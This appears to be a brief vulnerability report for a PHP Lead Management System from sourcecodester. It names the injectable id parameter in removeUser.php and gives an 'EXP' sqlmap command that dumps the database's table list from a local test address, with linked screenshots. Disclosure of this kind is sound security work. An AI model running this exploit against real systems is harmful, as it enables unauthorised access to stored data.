vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/208411702-6738b92b-7e8a-4825-a6b2-c52cc868222c.png)


EXP

```
sqlmap.py -u "http://192.168.31.50/penglead/php_action/removeUser.php?id=1" --dbms=mysql -D penglead --tables
```
![image](https://user-images.githubusercontent.com/30823782/208411743-f0b9a0cd-701c-43dd-8e4c-625048c64c12.png)

